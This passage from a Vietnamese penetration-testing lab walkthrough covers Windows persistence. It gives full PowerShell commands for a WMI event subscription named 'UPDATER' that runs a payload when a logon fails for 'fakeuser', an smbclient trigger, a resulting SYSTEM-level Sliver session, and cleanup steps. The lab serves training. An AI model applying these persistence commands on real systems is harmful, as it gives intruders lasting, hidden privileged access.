reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "User Persist" /F
```

![alt text](IMG/LAB3/LAB3.3/image-18.png)

Các tùy chọn cho lệnh này là:

- `reg` - lệnh cần chạy.

- `delete` - xóa một khóa.

- `"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"` - Vị trí để thêm khóa.

- `/V "User Persist"` - Tên của khóa (Giá trị).

### 6. Tính năng lưu trữ bộ lọc sự kiện WMI

Bộ lọc sự kiện WMI cho phép linh hoạt rất nhiều trong việc kích hoạt payloads của chúng ta. Chúng ta sẽ thiết lập một trình lắng nghe sự kiện cho việc đăng nhập không thành công (ID sự kiện 4625) cho người dùng `fakeuser`. Điều này sẽ cho phép chúng ta kích hoạt payloads của mình khi đăng nhập không thành công đối với một người dùng không tồn tại!

Chúng ta sẽ sử dụng các lệnh PowerShell bên dưới để thiết lập bộ lọc. Bạn cần có quyền quản trị viên trong cửa sổ PowerShell để thiết lập việc này.

![alt text](IMG/LAB3/LAB3.3/image-19.png)

Quá trình thiết lập gồm ba phần.

- Lệnh đầu tiên chúng ta sẽ sử dụng để thiết lập Bộ lọc Sự kiện `-Class __EventFilter` với tên là `UPDATER`. Sau đó, truy vấn sẽ tìm kiếm các lần đăng nhập thất bại (ID Sự kiện 4625) trong đó thông tin đăng nhập khớp với fakeuser.

- Phần thứ hai thiết lập trình xử lý dữ liệu, hay nói cách khác là xử lý khi bộ lọc khớp. Trong trường hợp này, các kết quả khớp với UPDATERbộ lọc sẽ chạy tải trọng của chúng ta nằm tại `C:\Users\sec560\Desktop\payload.exe`.

- Bước cuối cùng thiết lập liên kết để tìm kiếm tác nhân kích hoạt và chạy trình tiêu thụ (payload) của chúng ta.

Các lệnh ở đây khá phức tạp. Vui lòng sao chép và dán các lệnh này vào cửa sổ PowerShell với quyền quản trị viên.

```bash
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = "UPDATER"; Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND Targetinstance.EventCode = '4625' And Targetinstance.Message Like '%fakeuser%'"; QueryLanguage = 'WQL'}

$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = "UPDATER"; CommandLineTemplate = "C:\Users\sec560\Desktop\payload.exe"}

$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}
```

![alt text](IMG/LAB3/LAB3.3/image-20.png)

Bây giờ chúng ta đã thiết lập bộ lọc, hãy chuyển sang Linux, mở một cửa sổ terminal mới và thử đăng nhập bằng `smbclient` tài khoản của chúng ta `fakeuser`. Quá trình này có thể mất một lúc để bộ lọc phát hiện việc đăng nhập. Bạn có thể cần đợi đến một phút.

```bash
smbclient '\\10.130.10.25\c$' -U fakeuser fakepass
```

![alt text](IMG/LAB3/LAB3.3/image-21.png)

Sau đó, bạn sẽ thấy một phiên làm việc mới trong Sliver!

![alt text](IMG/LAB3/LAB3.3/image-22.png)

Tương tác với phiên này bằng cách sử dụng hai ký tự đầu tiên của ID phiên `sessions -i`. Trong ví dụ này, đó là `750cb0ba` nên chúng ta sử dụng ID rút gọn là `75`. ID phiên của bạn sẽ khác!

```bash
sessions -i 75
```

![alt text](IMG/LAB3/LAB3.3/image-23.png)

Một lần nữa, hãy xem chúng ta đang chạy với tư cách người dùng nào `whoami`.

```bash
whoami
```

![alt text](IMG/LAB3/LAB3.3/image-24.png)

Như bạn thấy, điều này cấp quyền truy cập cấp HỆ THỐNG trên Windows. Nếu chúng ta mất quyền truy cập, tất cả những gì chúng ta cần làm là thử đăng nhập lại với tư cách người dùng không tồn tại `fakeuser` để có được một phiên làm việc mới.

Phương pháp chúng tôi sử dụng ở đây là thủ công và khá phức tạp, và điều quan trọng là phải hiểu những nguyên tắc cơ bản về cách thức hoạt động của nó. Tuy nhiên, có những lựa chọn khác để thực hiện việc này dễ dàng hơn:

- Metasploit - sử dụng mô-đun `windows/local/wmi_persistence`.

- Empires - sử dụng mô-đun `persistence/elevated/wmi`.

Hãy xóa bộ lọc này, bộ lọc và trình tiêu thụ bằng cửa sổ PowerShell hiện có mà bạn đang mở.

```bash
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Updater%'" | Remove-WmiObject -Verbose

Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "__Path LIKE '%UPDATER%'" | Remove-WmiObject -Verbose

Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "__Path LIKE '%UPDATER%'" | Remove-WmiObject -Verbose
```

![alt text](IMG/LAB3/LAB3.3/image-25.png)

## Phần kết luận

Chúng tôi đã sử dụng nhiều phương pháp khác nhau để duy trì quyền truy cập vào hệ thống Windows. Phương pháp bạn sử dụng phụ thuộc vào cấp độ quyền truy cập và cách bạn chọn để ẩn mình. Duy trì quyền truy cập thông qua việc kiên trì là một phần rất quan trọng của kiểm thử xâm nhập. Việc phải nỗ lực rất nhiều để giành được quyền truy cập rồi lại đánh mất nó là điều vô cùng khó chịu đối với bất kỳ người kiểm thử nào!

